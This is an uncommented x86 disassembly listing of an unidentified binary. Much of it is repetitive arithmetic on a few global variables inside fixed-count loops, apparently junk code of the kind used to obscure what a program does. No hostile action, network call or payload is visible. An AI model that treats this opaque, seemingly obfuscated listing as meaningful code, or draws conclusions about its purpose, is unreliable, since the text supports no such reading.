  42a457:	xor    ebp,ebp
  42a459:	mov    edx,eax
  42a45b:	add    edx,esi
  42a45d:	adc    ebp,edi
  42a45f:	push   0x0
  42a461:	add    edx,0x32
  42a464:	pop    edi
  42a465:	adc    ebp,edi
  42a467:	cmp    edx,ebx
  42a469:	jne    0x42a475
  42a46b:	xor    edx,edx
  42a46d:	cmp    ebp,edx
  42a46f:	jne    0x42a475
  42a471:	lea    eax,[esi+ebx*1+0x1f]
  42a475:	add    DWORD PTR [esp+0x10],0x5
  42a47a:	cmp    DWORD PTR [esp+0x10],0xc4f
  42a482:	movzx  edx,bl
  42a485:	lea    esi,[edx+eax*1+0x4]
  42a489:	mov    edx,DWORD PTR ds:0x43e094
  42a48f:	jl     0x42a442
  42a491:	add    eax,ecx
  42a493:	lea    eax,[edx+eax*1+0x3ef9]
  42a49a:	mov    ds:0x43e094,eax
  42a49f:	lea    eax,[esi+ebx*1+0x5]
  42a4a3:	mov    ecx,eax
  42a4a5:	dec    ecx
  42a4a6:	je     0x42a4ce
  42a4a8:	sub    ecx,0x12
  42a4ab:	je     0x42a4c7
  42a4ad:	xor    edx,edx
  42a4af:	xor    ebp,ebp
  42a4b1:	lea    ecx,[eax+0x2e]
  42a4b4:	sub    ecx,eax
  42a4b6:	sbb    edx,ebp
  42a4b8:	sub    ecx,esi
  42a4ba:	sbb    edx,edi
  42a4bc:	add    ecx,0x2e
  42a4bf:	adc    edx,ebp
  42a4c1:	mov    esi,ecx
  42a4c3:	mov    edi,edx
  42a4c5:	jmp    0x42a4d6
  42a4c7:	lea    esi,[ebx+0x18]
  42a4ca:	xor    edi,edi
  42a4cc:	jmp    0x42a4d6
  42a4ce:	movzx  eax,si
  42a4d1:	sub    eax,ebx
  42a4d3:	inc    eax
  42a4d4:	mov    ebx,eax
  42a4d6:	lea    ecx,[esi+ebx*1+0x1f]
  42a4da:	lea    eax,[ecx+ebx*1-0x32]
  42a4de:	cmp    eax,0x23e
  42a4e3:	mov    DWORD PTR ds:0x43e05c,ecx
  42a4e9:	jb     0x42a4f4
  42a4eb:	mov    esi,ebx
  42a4ed:	sub    esi,ecx
  42a4ef:	add    esi,0x2e
  42a4f2:	xor    edi,edi
  42a4f4:	mov    edx,DWORD PTR ds:0x43e094
  42a4fa:	movzx  eax,cl
  42a4fd:	lea    eax,[eax+edx*1-0xe]
  42a501:	xor    edx,edx
  42a503:	lea    ebp,[ebx-0x3222]
  42a509:	sub    ebp,esi
  42a50b:	mov    esi,ecx
  42a50d:	sbb    edx,edi
  42a50f:	dec    esi
  42a510:	je     0x42a545
  42a512:	sub    esi,0x12
  42a515:	je     0x42a539
  42a517:	xor    esi,esi
  42a519:	add    ecx,0x2e
  42a51c:	xor    edi,edi
  42a51e:	sub    ecx,DWORD PTR ds:0x43e05c
  42a524:	sbb    esi,edi
  42a526:	sub    ecx,ebp
  42a528:	sbb    esi,edx
  42a52a:	add    ecx,0x2e
  42a52d:	adc    esi,edi
  42a52f:	mov    ebp,ecx
  42a531:	mov    DWORD PTR ds:0x43e09c,esi
  42a537:	jmp    0x42a54d
  42a539:	and    DWORD PTR ds:0x43e09c,0x0
  42a540:	lea    ebp,[ebx+0x18]
  42a543:	jmp    0x42a54d
  42a545:	movzx  ecx,bp
  42a548:	sub    ecx,ebx
  42a54a:	inc    ecx
  42a54b:	mov    ebx,ecx
  42a54d:	lea    ecx,[ebx+ebp*1+0x5]
  42a551:	mov    edx,ecx
  42a553:	dec    edx
  42a554:	jne    0x42a562
  42a556:	movzx  ecx,bp
  42a559:	sub    ecx,ebx
  42a55b:	inc    ecx
  42a55c:	mov    ebx,ecx
  42a55e:	lea    ecx,[ebx+ebp*1+0x1f]
  42a562:	mov    esi,DWORD PTR ds:0x43e058
  42a568:	lea    edx,[ecx+eax*1+0x5]
  42a56c:	mov    edi,0x9b9
  42a571:	dec    edx
  42a572:	je     0x42a587
  42a574:	sub    edx,0x12
  42a577:	je     0x42a582
  42a579:	push   0x5c
  42a57b:	pop    edx
  42a57c:	sub    edx,eax
  42a57e:	mov    eax,edx
  42a580:	jmp    0x42a595
  42a582:	lea    eax,[esi+0x18]
  42a585:	jmp    0x42a595
  42a587:	movzx  edx,ax
  42a58a:	sub    edx,esi
  42a58c:	inc    edx
  42a58d:	mov    DWORD PTR ds:0x43e058,edx
  42a593:	mov    esi,edx
  42a595:	lea    edx,[eax+esi*1+0x5]
  42a599:	cmp    esi,edx
  42a59b:	jne    0x42a5b3
  42a59d:	mov    edx,eax
  42a59f:	imul   edx,edx,0x5c
  42a5a2:	cmp    esi,edx
  42a5a4:	je     0x42a5af
  42a5a6:	mov    edx,esi
  42a5a8:	sub    edx,eax
  42a5aa:	add    edx,0x2e
  42a5ad:	jmp    0x42a5b3
  42a5af:	lea    edx,[eax+esi*1+0x4]
  42a5b3:	lea    ebp,[eax+edx*1+0x32]
  42a5b7:	cmp    ebp,esi
  42a5b9:	jne    0x42a5bf
  42a5bb:	lea    edx,[eax+esi*1+0x1f]
  42a5bf:	dec    edi
  42a5c0:	jne    0x42a571
  42a5c2:	xor    ebp,ebp
  42a5c4:	push   ebp
  42a5c5:	movzx  edi,bl
  42a5c8:	push   0x5c
  42a5ca:	lea    edi,[edi+ecx*1-0xe]
  42a5ce:	push   ebp
  42a5cf:	push   edi
  42a5d0:	lea    esi,[ecx+eax*1+0x1f]
  42a5d4:	call   0x437b80
  42a5d9:	cmp    ebx,eax
  42a5db:	jne    0x42a5e3
  42a5dd:	xor    eax,eax
  42a5df:	cmp    eax,edx
  42a5e1:	je     0x42a5ec
  42a5e3:	mov    eax,ebx
  42a5e5:	sub    eax,edi
  42a5e7:	add    eax,0x2e
  42a5ea:	jmp    0x42a5f0
  42a5ec:	lea    eax,[edi+ebx*1+0x4]
  42a5f0:	movzx  eax,al
  42a5f3:	mov    ecx,ebx
  42a5f5:	sub    ecx,edi
  42a5f7:	lea    eax,[eax+esi*1+0x4]
  42a5fb:	add    ecx,0x2e
  42a5fe:	dec    esi
  42a5ff:	mov    ds:0x43e07c,eax
  42a604:	je     0x42a627
  42a606:	sub    esi,0x12
  42a609:	je     0x42a618
  42a60b:	push   0x5c
  42a60d:	pop    edx
  42a60e:	sub    edx,eax
  42a610:	mov    DWORD PTR ds:0x43e07c,edx
  42a616:	jmp    0x42a636
  42a618:	mov    eax,ds:0x43e058
  42a61d:	add    eax,0x18
  42a620:	mov    ds:0x43e07c,eax
  42a625:	jmp    0x42a636
  42a627:	movzx  eax,ax
  42a62a:	sub    eax,DWORD PTR ds:0x43e058
  42a630:	inc    eax
  42a631:	mov    ds:0x43e058,eax
  42a636:	push   0x3c
  42a638:	pop    esi
  42a639:	cmp    ebx,edi
  42a63b:	jne    0x42a643
  42a63d:	xor    eax,eax
  42a63f:	cmp    eax,ebp
  42a641:	je     0x42a67f
  42a643:	lea    ecx,[edi+ebx*1+0x5]
  42a647:	cmp    ecx,0x39b
  42a64d:	je     0x42a67f
  42a64f:	xor    edx,edx
  42a651:	mov    eax,ecx
  42a653:	add    eax,edi
  42a655:	adc    edx,ebp
  42a657:	push   0x0
  42a659:	add    eax,0x32
  42a65c:	pop    ebp
  42a65d:	adc    edx,ebp
  42a65f:	cmp    eax,ebx
  42a661:	jne    0x42a66d
  42a663:	xor    eax,eax
  42a665:	cmp    edx,eax
  42a667:	jne    0x42a66d
  42a669:	lea    ecx,[edi+ebx*1+0x1f]
  42a66d:	movzx  edi,bl
  42a670:	add    esi,0x5
  42a673:	cmp    esi,0xc4f
  42a679:	lea    edi,[edi+ecx*1+0x4]
  42a67d:	jl     0x42a639
  42a67f:	movzx  eax,bx
  42a682:	cdq    
  42a683:	mov    ebp,eax
  42a685:	mov    esi,ecx
  42a687:	sub    esi,DWORD PTR ds:0x43e07c
  42a68d:	mov    eax,edx
  42a68f:	add    esi,0x2e
  42a692:	push   0x0
  42a694:	pop    edx
  42a695:	mov    DWORD PTR [esp+0x1c],eax
  42a699:	mov    DWORD PTR [esp+0x18],ebp
  42a69d:	sub    ebp,edi
  42a69f:	sbb    eax,edx
  42a6a1:	add    ebp,ecx
  42a6a3:	adc    eax,edx
  42a6a5:	mov    ds:0x43e09c,eax
  42a6aa:	push   0x48
  42a6ac:	mov    eax,esi
  42a6ae:	pop    edi
  42a6af:	div    edi
  42a6b1:	cmp    eax,0x65
  42a6b4:	mov    eax,ds:0x43e058
  42a6b9:	jbe    0x42a6ca
  42a6bb:	mov    edx,DWORD PTR ds:0x43e07c
  42a6c1:	add    edx,eax
  42a6c3:	lea    esi,[esi+edx*1+0x3ef9]
  42a6ca:	mov    edi,DWORD PTR [esp+0x18]
  42a6ce:	sub    edi,ebp
  42a6d0:	mov    ebp,DWORD PTR [esp+0x1c]
  42a6d4:	sbb    ebp,DWORD PTR ds:0x43e09c
  42a6da:	movzx  edx,cl
  42a6dd:	lea    edx,[edx+esi*1+0x4]
  42a6e1:	mov    DWORD PTR ds:0x43e07c,edx
  42a6e7:	push   0x0
  42a6e9:	add    edi,ecx
  42a6eb:	pop    edx
  42a6ec:	adc    ebp,edx
  42a6ee:	lea    edx,[eax+esi*1-0x32]
  42a6f2:	cmp    edx,0x23e
  42a6f8:	jb     0x42a704
  42a6fa:	sub    eax,esi
  42a6fc:	add    eax,0x2e
  42a6ff:	mov    ds:0x43e07c,eax
  42a704:	lea    eax,[edi+ebx*1]
  42a707:	lea    ecx,[ecx+eax*1+0x3ef9]
  42a70e:	push   0x48
  42a710:	xor    edx,edx
  42a712:	mov    eax,ecx
  42a714:	pop    esi
  42a715:	div    esi
  42a717:	cmp    eax,0x65
  42a71a:	jbe    0x42a726
  42a71c:	lea    eax,[edi+ebx*1]
  42a71f:	lea    ecx,[ecx+eax*1+0x3ef9]
  42a726:	mov    edx,DWORD PTR ds:0x43e07c
  42a72c:	sub    ecx,edx
  42a72e:	add    ecx,0x2e
  42a731:	mov    esi,ecx
  42a733:	dec    ecx
  42a734:	lea    eax,[edi+ebx*1+0x4]
  42a738:	jne    0x42a74e
  42a73a:	movzx  ecx,dx
  42a73d:	sub    ecx,DWORD PTR ds:0x43e058
  42a743:	inc    ecx
  42a744:	mov    DWORD PTR ds:0x43e058,ecx
  42a74a:	lea    esi,[edx+ecx*1+0x1f]
  42a74e:	mov    DWORD PTR [esp+0x10],0x3c
  42a756:	cmp    ebx,edi
  42a758:	jne    0x42a760
  42a75a:	xor    ecx,ecx
  42a75c:	cmp    ecx,ebp
  42a75e:	je     0x42a79f
  42a760:	lea    eax,[edi+ebx*1+0x5]
  42a764:	cmp    eax,0x39b
  42a769:	je     0x42a79f
  42a76b:	xor    ecx,ecx
  42a76d:	mov    edx,eax
  42a76f:	add    edx,edi
  42a771:	adc    ecx,ebp
  42a773:	push   0x0
  42a775:	add    edx,0x32
  42a778:	pop    ebp
  42a779:	adc    ecx,ebp
  42a77b:	cmp    edx,ebx
  42a77d:	jne    0x42a789
  42a77f:	xor    edx,edx
  42a781:	cmp    ecx,edx
  42a783:	jne    0x42a789
  42a785:	lea    eax,[edi+ebx*1+0x1f]
  42a789:	add    DWORD PTR [esp+0x10],0x5
  42a78e:	cmp    DWORD PTR [esp+0x10],0xc4f
  42a796:	movzx  edi,bl
  42a799:	lea    edi,[edi+eax*1+0x4]
  42a79d:	jl     0x42a756
  42a79f:	mov    edx,DWORD PTR ds:0x43e058
  42a7a5:	movzx  ecx,al
  42a7a8:	lea    esi,[ecx+esi*1-0xe]
  42a7ac:	movzx  ecx,bl
  42a7af:	push   0x3c
  42a7b1:	lea    edi,[ecx+eax*1-0xe]
  42a7b5:	xor    ebp,ebp
  42a7b7:	pop    ecx
  42a7b8:	cmp    edx,esi
  42a7ba:	je     0x42a7f4
  42a7bc:	lea    eax,[esi+edx*1+0x5]
  42a7c0:	cmp    eax,0x39b
  42a7c5:	je     0x42a7f4
  42a7c7:	lea    edx,[esi+eax*1+0x32]
  42a7cb:	cmp    edx,DWORD PTR ds:0x43e058
  42a7d1:	jne    0x42a7dc
  42a7d3:	mov    eax,ds:0x43e058
  42a7d8:	lea    eax,[esi+eax*1+0x1f]
  42a7dc:	mov    edx,DWORD PTR ds:0x43e058
  42a7e2:	movzx  esi,dl
  42a7e5:	add    ecx,0x5
  42a7e8:	cmp    ecx,0xc4f
  42a7ee:	lea    esi,[esi+eax*1+0x4]
  42a7f2:	jl     0x42a7b8
  42a7f4:	push   0x0
  42a7f6:	push   0x5c
  42a7f8:	push   ebp
  42a7f9:	push   edi
  42a7fa:	call   0x437b80
  42a7ff:	cmp    ebx,eax
  42a801:	jne    0x42a809
  42a803:	xor    eax,eax
  42a805:	cmp    eax,edx
  42a807:	je     0x42a812
  42a809:	mov    ecx,ebx
  42a80b:	sub    ecx,edi
  42a80d:	add    ecx,0x2e
  42a810:	jmp    0x42a816
  42a812:	lea    ecx,[edi+ebx*1+0x4]
  42a816:	and    DWORD PTR ds:0x43e09c,0x0
  42a81d:	movzx  edx,bl
  42a820:	lea    eax,[ecx+esi*1+0x5]
  42a824:	lea    ebp,[edx+ecx*1+0x4]
  42a828:	mov    DWORD PTR [esp+0x14],0x9b9
  42a830:	dec    eax
  42a831:	je     0x42a84c
  42a833:	sub    eax,0x12
  42a836:	mov    edx,DWORD PTR ds:0x43e058
  42a83c:	je     0x42a847
  42a83e:	push   0x5c
  42a840:	pop    eax
  42a841:	sub    eax,esi
  42a843:	mov    esi,eax
  42a845:	jmp    0x42a85d
  42a847:	lea    esi,[edx+0x18]
  42a84a:	jmp    0x42a85d
  42a84c:	movzx  eax,si
  42a84f:	sub    eax,DWORD PTR ds:0x43e058
  42a855:	inc    eax
  42a856:	mov    ds:0x43e058,eax
  42a85b:	mov    edx,eax
  42a85d:	lea    edi,[esi+edx*1]
  42a860:	lea    eax,[edi+0x5]
  42a863:	cmp    edx,eax
  42a865:	mov    DWORD PTR [esp+0x10],edi
  42a869:	jne    0x42a880
  42a86b:	mov    eax,esi
  42a86d:	imul   eax,eax,0x5c
  42a870:	cmp    edx,eax
  42a872:	je     0x42a87d
  42a874:	mov    eax,edx
  42a876:	sub    eax,esi
  42a878:	add    eax,0x2e
  42a87b:	jmp    0x42a880
  42a87d:	lea    eax,[edi+0x4]
  42a880:	lea    edi,[esi+eax*1+0x32]
  42a884:	cmp    edi,edx
  42a886:	jne    0x42a88f
  42a888:	mov    eax,DWORD PTR [esp+0x10]
  42a88c:	add    eax,0x1f
  42a88f:	dec    DWORD PTR [esp+0x14]
  42a893:	jne    0x42a830
  42a895:	xor    edi,edi
  42a897:	mov    esi,ecx
  42a899:	sub    esi,ebp
  42a89b:	sbb    edi,DWORD PTR ds:0x43e09c
  42a8a1:	add    esi,DWORD PTR [esp+0x18]
  42a8a5:	movzx  edx,cl
  42a8a8:	adc    edi,DWORD PTR [esp+0x1c]
  42a8ac:	lea    edx,[edx+eax*1+0x4]
  42a8b0:	mov    DWORD PTR ds:0x43e07c,edx
  42a8b6:	mov    DWORD PTR [esp+0x14],0x9b9
  42a8be:	jmp    0x42a8c6
  42a8c0:	mov    edx,DWORD PTR ds:0x43e07c
  42a8c6:	dec    eax
  42a8c7:	je     0x42a8e8
  42a8c9:	sub    eax,0x12
  42a8cc:	mov    ebp,DWORD PTR ds:0x43e058
  42a8d2:	je     0x42a8e3
  42a8d4:	push   0x5c
  42a8d6:	pop    eax
  42a8d7:	sub    eax,edx
  42a8d9:	mov    edx,eax
  42a8db:	mov    DWORD PTR ds:0x43e07c,edx
  42a8e1:	jmp    0x42a8f9
  42a8e3:	lea    edx,[ebp+0x18]
  42a8e6:	jmp    0x42a8db
  42a8e8:	movzx  eax,dx
  42a8eb:	sub    eax,DWORD PTR ds:0x43e058
  42a8f1:	inc    eax
  42a8f2:	mov    ds:0x43e058,eax
  42a8f7:	mov    ebp,eax
  42a8f9:	lea    eax,[edx+ebp*1]
  42a8fc:	mov    DWORD PTR [esp+0x10],eax
  42a900:	add    eax,0x5
  42a903:	cmp    ebp,eax
  42a905:	jne    0x42a920
  42a907:	mov    eax,edx
  42a909:	imul   eax,eax,0x5c
  42a90c:	cmp    ebp,eax
  42a90e:	je     0x42a919
  42a910:	mov    eax,ebp
  42a912:	sub    eax,edx
  42a914:	add    eax,0x2e
  42a917:	jmp    0x42a920
  42a919:	mov    eax,DWORD PTR [esp+0x10]
  42a91d:	add    eax,0x4
  42a920:	lea    edx,[edx+eax*1+0x32]
  42a924:	cmp    edx,ebp
  42a926:	jne    0x42a92f
  42a928:	mov    eax,DWORD PTR [esp+0x10]
  42a92c:	add    eax,0x1f
  42a92f:	dec    DWORD PTR [esp+0x14]
  42a933:	jne    0x42a8c0
  42a935:	mov    DWORD PTR [esp+0x14],0x9b9
  42a93d:	mov    eax,ecx
  42a93f:	dec    eax
  42a940:	je     0x42a968
  42a942:	sub    eax,0x12
  42a945:	je     0x42a961
  42a947:	xor    edx,edx
  42a949:	xor    ebp,ebp
  42a94b:	lea    eax,[ecx+0x2e]
  42a94e:	sub    eax,ecx
  42a950:	sbb    edx,ebp
  42a952:	sub    eax,esi
  42a954:	sbb    edx,edi
  42a956:	add    eax,0x2e
  42a959:	adc    edx,ebp
  42a95b:	mov    esi,eax
  42a95d:	mov    edi,edx
  42a95f:	jmp    0x42a970
  42a961:	lea    esi,[ebx+0x18]
  42a964:	xor    edi,edi
  42a966:	jmp    0x42a970
  42a968:	movzx  eax,si
  42a96b:	sub    eax,ebx
  42a96d:	inc    eax
  42a96e:	mov    ebx,eax
  42a970:	lea    ecx,[esi+ebx*1+0x5]
  42a974:	cmp    ebx,ecx
  42a976:	jne    0x42a99a
  42a978:	push   0x0
  42a97a:	push   0x5c
  42a97c:	push   edi
  42a97d:	push   esi
  42a97e:	call   0x437b80
  42a983:	xor    ecx,ecx
  42a985:	cmp    ebx,eax
  42a987:	jne    0x42a98d
  42a989:	cmp    ecx,edx
  42a98b:	je     0x42a996
  42a98d:	mov    ecx,ebx
  42a98f:	sub    ecx,esi
  42a991:	add    ecx,0x2e
  42a994:	jmp    0x42a99a
  42a996:	lea    ecx,[esi+ebx*1+0x4]
  42a99a:	xor    edx,edx
  42a99c:	mov    eax,ecx
  42a99e:	add    eax,esi
  42a9a0:	adc    edx,edi
  42a9a2:	add    eax,0x32
  42a9a5:	adc    edx,0x0
  42a9a8:	xor    ebp,ebp
  42a9aa:	cmp    eax,ebx
  42a9ac:	jne    0x42a9b6
  42a9ae:	cmp    edx,ebp
  42a9b0:	jne    0x42a9b6
  42a9b2:	lea    ecx,[esi+ebx*1+0x1f]
  42a9b6:	dec    DWORD PTR [esp+0x14]
  42a9ba:	jne    0x42a93d
  42a9bc:	mov    eax,ds:0x43e07c
  42a9c1:	lea    eax,[ecx+eax*1+0x5]
  42a9c5:	mov    ds:0x43e094,eax
  42a9ca:	movzx  eax,bl
  42a9cd:	lea    esi,[eax+ecx*1+0x4]
  42a9d1:	xor    edi,edi
  42a9d3:	mov    DWORD PTR [esp+0x14],0x9b9
  42a9db:	mov    eax,ecx
  42a9dd:	dec    eax
  42a9de:	je     0x42aa06
  42a9e0:	sub    eax,0x12
  42a9e3:	je     0x42a9ff
  42a9e5:	xor    edx,edx
  42a9e7:	xor    ebp,ebp
  42a9e9:	lea    eax,[ecx+0x2e]
  42a9ec:	sub    eax,ecx
  42a9ee:	sbb    edx,ebp
  42a9f0:	sub    eax,esi
  42a9f2:	sbb    edx,edi
  42a9f4:	add    eax,0x2e
  42a9f7:	adc    edx,ebp
  42a9f9:	mov    esi,eax
  42a9fb:	mov    edi,edx
  42a9fd:	jmp    0x42aa0e
  42a9ff:	lea    esi,[ebx+0x18]
  42aa02:	xor    edi,edi
  42aa04:	jmp    0x42aa0e
  42aa06:	movzx  eax,si
  42aa09:	sub    eax,ebx
  42aa0b:	inc    eax
  42aa0c:	mov    ebx,eax
  42aa0e:	lea    ecx,[esi+ebx*1+0x5]
  42aa12:	cmp    ebx,ecx
  42aa14:	jne    0x42aa38
  42aa16:	push   0x0
  42aa18:	push   0x5c
  42aa1a:	push   edi
  42aa1b:	push   esi
  42aa1c:	call   0x437b80
  42aa21:	xor    ecx,ecx
  42aa23:	cmp    ebx,eax
  42aa25:	jne    0x42aa2b
  42aa27:	cmp    ecx,edx
  42aa29:	je     0x42aa34
  42aa2b:	mov    ecx,ebx
  42aa2d:	sub    ecx,esi
  42aa2f:	add    ecx,0x2e
  42aa32:	jmp    0x42aa38
  42aa34:	lea    ecx,[esi+ebx*1+0x4]
  42aa38:	xor    edx,edx
  42aa3a:	mov    eax,ecx
  42aa3c:	add    eax,esi
  42aa3e:	adc    edx,edi
  42aa40:	add    eax,0x32
  42aa43:	adc    edx,0x0
  42aa46:	xor    ebp,ebp
  42aa48:	cmp    eax,ebx
  42aa4a:	jne    0x42aa54
  42aa4c:	cmp    edx,ebp
  42aa4e:	jne    0x42aa54
  42aa50:	lea    ecx,[esi+ebx*1+0x1f]
  42aa54:	dec    DWORD PTR [esp+0x14]
  42aa58:	jne    0x42a9db
  42aa5a:	mov    edx,DWORD PTR ds:0x43e094
  42aa60:	movzx  eax,cl
  42aa63:	lea    edx,[eax+edx*1-0xe]
  42aa67:	xor    ebp,ebp
  42aa69:	lea    eax,[ebx-0x3222]
  42aa6f:	sub    eax,esi
  42aa71:	mov    esi,DWORD PTR ds:0x43e094
  42aa77:	sbb    ebp,edi
  42aa79:	dec    esi
  42aa7a:	mov    DWORD PTR ds:0x43e09c,ebp
  42aa80:	mov    DWORD PTR ds:0x43e07c,edx
  42aa86:	mov    ds:0x43e098,eax
  42aa8b:	pop    ebp
  42aa8c:	je     0x42aaad
  42aa8e:	sub    esi,0x12
  42aa91:	je     0x42aaa2
  42aa93:	push   0x5c
  42aa95:	pop    esi
  42aa96:	sub    esi,edx
  42aa98:	mov    edx,esi
  42aa9a:	mov    DWORD PTR ds:0x43e07c,edx
  42aaa0:	jmp    0x42aabd
  42aaa2:	mov    edx,DWORD PTR ds:0x43e058
  42aaa8:	add    edx,0x18
  42aaab:	jmp    0x42aa9a
  42aaad:	movzx  esi,dx
  42aab0:	sub    esi,DWORD PTR ds:0x43e058
  42aab6:	inc    esi
  42aab7:	mov    DWORD PTR ds:0x43e058,esi
  42aabd:	lea    esi,[ecx+ebx*1-0x32]
  42aac1:	cmp    esi,0x23e
  42aac7:	jb     0x42aadc
  42aac9:	mov    eax,ebx
  42aacb:	sub    eax,ecx
  42aacd:	add    eax,0x2e
  42aad0:	and    DWORD PTR ds:0x43e09c,0x0
  42aad7:	mov    ds:0x43e098,eax
  42aadc:	lea    ecx,[eax+ebx*1+0x5]
  42aae0:	mov    DWORD PTR ds:0x43e05c,ecx
  42aae6:	sub    ecx,edx
  42aae8:	add    ecx,0x2e
  42aaeb:	mov    DWORD PTR ds:0x43e094,ecx
  42aaf1:	call   0x426aba
  42aaf6:	mov    edx,DWORD PTR ds:0x43e05c
  42aafc:	and    DWORD PTR ds:0x43e09c,0x0
  42ab03:	movzx  ecx,bl
  42ab06:	lea    ecx,[ecx+edx*1+0x4]
  42ab0a:	mov    ds:0x43e058,eax
  42ab0f:	mov    DWORD PTR ds:0x43e098,ecx
  42ab15:	call   0x42739a
  42ab1a:	mov    ecx,DWORD PTR ds:0x43e05c
  42ab20:	mov    esi,eax
  42ab22:	push   0x48
  42ab24:	xor    edx,edx
  42ab26:	mov    eax,ecx
  42ab28:	pop    edi
  42ab29:	div    edi
  42ab2b:	mov    DWORD PTR ds:0x43e094,esi
  42ab31:	cmp    eax,0x65
  42ab34:	jbe    0x42ab4a
  42ab36:	mov    eax,ds:0x43e098
  42ab3b:	add    eax,ebx
  42ab3d:	lea    ecx,[ecx+eax*1+0x3ef9]
  42ab44:	mov    DWORD PTR ds:0x43e05c,ecx
  42ab4a:	movzx  eax,cl
  42ab4d:	lea    eax,[eax+esi*1-0xe]
  42ab51:	mov    ds:0x43e07c,eax
  42ab56:	mov    eax,esi
  42ab58:	call   0x427f1e
  42ab5d:	sub    ebx,DWORD PTR ds:0x43e098
  42ab63:	mov    ds:0x43e07c,eax
  42ab68:	add    ebx,0x2e
  42ab6b:	mov    DWORD PTR ds:0x43e05c,ebx
  42ab71:	call   0x427f1e
  42ab76:	mov    ecx,DWORD PTR ds:0x43e07c
  42ab7c:	mov    edx,DWORD PTR ds:0x43e094
  42ab82:	pop    edi
  42ab83:	add    ecx,eax
  42ab85:	lea    ecx,[edx+ecx*2+0x7df2]
  42ab8c:	pop    esi
  42ab8d:	mov    ds:0x43e05c,eax
  42ab92:	mov    DWORD PTR ds:0x43e094,ecx
  42ab98:	pop    ebx
  42ab99:	add    esp,0x10
  42ab9c:	ret    
  42ab9d:	mov    eax,0x438090
  42aba2:	call   0x42f168
  42aba7:	sub    esp,0x34
  42abaa:	push   ebx
  42abab:	push   esi
  42abac:	push   edi
  42abad:	mov    DWORD PTR [ebp-0x10],esp
  42abb0:	and    DWORD PTR [ebp-0x4],0x0
  42abb4:	push   0x43b52c
  42abb9:	lea    ecx,[ebp-0x40]
  42abbc:	call   0x42ae9f
  42abc1:	mov    esi,eax
  42abc3:	mov    DWORD PTR [ebp-0x18],esi
  42abc6:	lea    eax,[ebp-0x1c]
  42abc9:	push   eax
  42abca:	or     eax,0xffffffff
  42abcd:	xor    ecx,ecx
  42abcf:	call   0x42c94c
  42abd4:	push   0x0
  42abd6:	push   0x1
  42abd8:	lea    ecx,[ebp-0x40]
  42abdb:	call   0x42bb7b
  42abe0:	or     DWORD PTR [ebp-0x4],0xffffffff
  42abe4:	mov    ecx,DWORD PTR ds:0x43e05c
  42abea:	xor    esi,esi
  42abec:	sub    ecx,DWORD PTR ds:0x43e098
  42abf2:	sbb    esi,DWORD PTR ds:0x43e09c
  42abf8:	mov    edi,DWORD PTR [ebp-0x24]
  42abfb:	movzx  eax,di
  42abfe:	cdq    
  42abff:	add    ecx,eax
  42ac01:	mov    DWORD PTR ds:0x43e098,ecx
  42ac07:	adc    esi,edx
  42ac09:	mov    DWORD PTR ds:0x43e09c,esi
  42ac0f:	mov    eax,ds:0x43e07c
  42ac14:	mov    edx,eax
  42ac16:	dec    edx
  42ac17:	je     0x42ac84
  42ac19:	sub    edx,0x12
  42ac1c:	je     0x42ac72
  42ac1e:	lea    edx,[eax+0x2e]
  42ac21:	xor    edi,edi
  42ac23:	xor    ebx,ebx
  42ac25:	sub    edx,eax
  42ac27:	sbb    edi,ebx
  42ac29:	sub    edx,ecx
  42ac2b:	sbb    edi,esi
  42ac2d:	add    edx,0x2e
  42ac30:	adc    edi,ebx
  42ac32:	mov    DWORD PTR ds:0x43e098,edx
  42ac38:	mov    DWORD PTR ds:0x43e09c,edi
  42ac3e:	jmp    0x42ac92
  42ac40:	push   0xa
  42ac42:	mov    ecx,DWORD PTR [ebp-0x20]
  42ac45:	mov    eax,DWORD PTR [ecx]
  42ac47:	call   DWORD PTR [eax+0x4]
  42ac4a:	push   eax
  42ac4b:	push   0x43b518
  42ac50:	push   0x43fa40
  42ac55:	call   0x42c5b4
  42ac5a:	pop    ecx
  42ac5b:	pop    ecx
  42ac5c:	push   eax
  42ac5d:	call   0x42c5b4
  42ac62:	pop    ecx
  42ac63:	pop    ecx
  42ac64:	push   eax
  42ac65:	call   0x42c71d
  42ac6a:	pop    ecx
  42ac6b:	pop    ecx
  42ac6c:	mov    eax,0x42abe0
  42ac71:	ret    
  42ac72:	add    edi,0x18
  42ac75:	mov    DWORD PTR ds:0x43e098,edi
  42ac7b:	and    DWORD PTR ds:0x43e09c,0x0
  42ac82:	jmp    0x42ac92
  42ac84:	movzx  eax,cx
  42ac87:	sub    eax,edi
  42ac89:	lea    eax,[eax+ecx*1+0x20]
  42ac8d:	mov    ds:0x43e07c,eax
  42ac92:	call   0x42680b
  42ac97:	mov    ds:0x464e94,eax
  42ac9c:	mov    eax,ds:0x43e058
  42aca1:	mov    ecx,DWORD PTR ds:0x43e094
  42aca7:	lea    edx,[eax+ecx*1-0x32]
  42acab:	cmp    edx,0x23e
  42acb1:	jb     0x42acc0
  42acb3:	mov    edx,eax
  42acb5:	sub    edx,ecx
  42acb7:	add    edx,0x2e
  42acba:	mov    DWORD PTR ds:0x43e07c,edx
  42acc0:	movzx  eax,al
  42acc3:	mov    ecx,DWORD PTR ds:0x43e05c
  42acc9:	lea    eax,[eax+ecx*1-0xe]
  42accd:	mov    ds:0x43e098,eax
  42acd2:	and    DWORD PTR ds:0x43e09c,0x0
  42acd9:	push   eax
  42acda:	call   0x429550
  42acdf:	pop    ecx
  42ace0:	mov    eax,ds:0x43e094
  42ace5:	mov    ecx,DWORD PTR ds:0x43e098
  42aceb:	lea    ecx,[ecx+eax*1+0x5]
  42acef:	mov    DWORD PTR ds:0x43e05c,ecx
  42acf5:	dec    eax
  42acf6:	je     0x42ad17
  42acf8:	sub    eax,0x12
  42acfb:	je     0x42ad0d
  42acfd:	push   0x5c
  42acff:	pop    eax
  42ad00:	sub    eax,DWORD PTR ds:0x43e07c
  42ad06:	mov    ds:0x43e07c,eax
  42ad0b:	jmp    0x42ad35
  42ad0d:	mov    eax,ds:0x43e058
  42ad12:	add    eax,0x18
  42ad15:	jmp    0x42ad06
  42ad17:	mov    ecx,DWORD PTR ds:0x43e07c
  42ad1d:	movzx  eax,cx
  42ad20:	sub    eax,DWORD PTR ds:0x43e058
  42ad26:	inc    eax
  42ad27:	mov    ds:0x43e058,eax
  42ad2c:	lea    eax,[eax+ecx*1+0x1f]
  42ad30:	mov    ds:0x43e094,eax
  42ad35:	call   0x425e46
  42ad3a:	mov    eax,ds:0x43e098
  42ad3f:	call   0x428bdd
  42ad44:	mov    esi,DWORD PTR ds:0x43e098
  42ad4a:	mov    edi,DWORD PTR ds:0x43e094
  42ad50:	lea    eax,[esi+edi*1]
